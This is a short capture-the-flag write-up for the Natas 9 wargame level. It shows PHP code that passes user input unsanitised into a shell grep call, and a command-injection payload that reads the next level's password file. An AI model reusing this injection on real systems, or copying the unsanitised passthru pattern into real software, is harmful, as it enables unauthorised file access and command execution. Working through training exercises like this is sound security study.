# Natas 9 
The natas9 level starts with a prompt saying *Find words containing:* on examing the source code:
```
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

we see that its basically doing a grep command in bash to get all the words from a file called *dictionary.txt*.
All we have to do is make it print contents of */etc/natas_webpass/natas10* to get to next level. we can use some regular expressions to solve it. I used the following command to solve it:
```
"^" /etc/natas_webpass/natas10 #
```

Here we are injecting user controlled variable and essentially making the resulting command to be:
```
grep -i "^" /etc/natas_webpass/natas10 #dictionary.txt
```
1. # -> this in bash in is comment
1. ^ -> this is regex and meaning any word or string that starts, essentially meaning all the words or strings.

I have written a python script to do the essentially the same.
